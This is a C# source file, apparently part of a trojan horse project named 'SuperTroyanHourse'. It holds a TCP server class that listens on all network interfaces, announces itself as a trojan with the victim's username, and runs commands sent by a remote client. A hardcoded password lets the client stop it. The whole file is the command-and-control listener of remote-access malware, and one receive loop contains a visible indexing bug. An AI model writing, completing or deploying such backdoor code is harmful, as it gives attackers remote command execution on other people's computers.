using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace SuperTroyanHourse
{
    internal static class TCPServer
    {
        private static Socket s;
        static bool IsOpened = false;

        public static void Start()
        {
            try
            {
                TcpListener myList = new TcpListener(IPAddress.Any, Program.port);

                Console.WriteLine("The server is running at ip {0}:{1} . . .", Internet.GetLocalIP(), Program.port);

                while (Program.isProgramAlive)
                {
                    ASCIIEncoding asen = new ASCIIEncoding();
                    myList.Start();
                    s = myList.AcceptSocket();
                    IsOpened = true;
                    Console.WriteLine("\n============ socket opened ==================\n");
                    string input = "";
                    s.Send(asen.GetBytes("<S>: " + "Welcome to the Super Troyan Horse program.\n" +
                                         "<S>: " + "My name is " + Program.username + ".\n" +
                                         "<S>: " + "You can now start sending me commands.\n"));
                    byte[] b = new byte[128];

                    while (input != "quit" && input != "exit")
                    {
                        input = "";
                        try
                        {
                            int k = s.Receive(b);
                            for (int i = 0; i < k; i++)
                                input += (Convert.ToChar(b[i]));
                            input = input.Replace("\n", "");
                            if (input != "quit" && input != "exit" && input != "stop")
                            {
                                string answer = commander.reactonCommand(input).Replace("\n", "\n<S>: ");
                                s.Send(asen.GetBytes("<S>: " + answer + "\n"));
                            }
                            else if (input == "stop")
                            {
                                const string password = "12qwaszx";
                                if (s == null)
                                    throw new NullReferenceException();
                                s.Send(asen.GetBytes("<S>: enter password: "));
                                input = string.Empty;
                                k = s.Receive(b);
                                for (int i = 0; i < k; i++)
                                    input += (Convert.ToChar(b[i]));
                                input = input.Replace("\n", "");
                                if (input == password)
                                {
                                    s.Close();
                                    myList.Stop();
                                    Program.isProgramAlive = false;
                                    System.Windows.Forms.Application.Exit();
                                    break;
                                }
                                else
                                    s.Send(asen.GetBytes("<S>: wrong password\n"));
                            }
                            else
                            {
                                s.Close();
                                break;
                            }
                        }
                        catch (SocketException)
                        {
                            s.Close();
                            break;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Source + "\n" + ex.ToString());
                        }
                    }

                    /* clean up */
                    s.Close();
                    myList.Stop();
                    Console.WriteLine("\n============ socket closed ==================\n");
                    IsOpened = false;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error..... " + e.StackTrace);
            }
        }

        public static void Send(string text, ASCIIEncoding asen = null)
        {
            if (!IsOpened)
                return;
            if (asen == null)
                asen = new ASCIIEncoding();
            try
            {
                s.Send(asen.GetBytes("<S>: " + text + "\n"));
            }
            catch { }
        }

        public static void Send(byte[] bytes)
        {
            if (!IsOpened)
                return;
            try
            {
                s.Send(bytes);
            }
            catch { }
        }

        public static byte[] ReciveBytes(int length = 128)
        {
            byte[] arr = new byte[length];
            int k = s.Receive(arr);
            for (int i = k; k < length; k++)
                arr[i] = 0;
            return arr;
        }

        public static string ReciveString(int length = 128)
        {
            byte[] arr = new byte[length];
            int k = s.Receive(arr);
            string input = string.Empty;
            for (int i = 0; i < k; i++)
                input += (Convert.ToChar(arr[i]));
            return input.Replace("\n", "");
        }
    }
}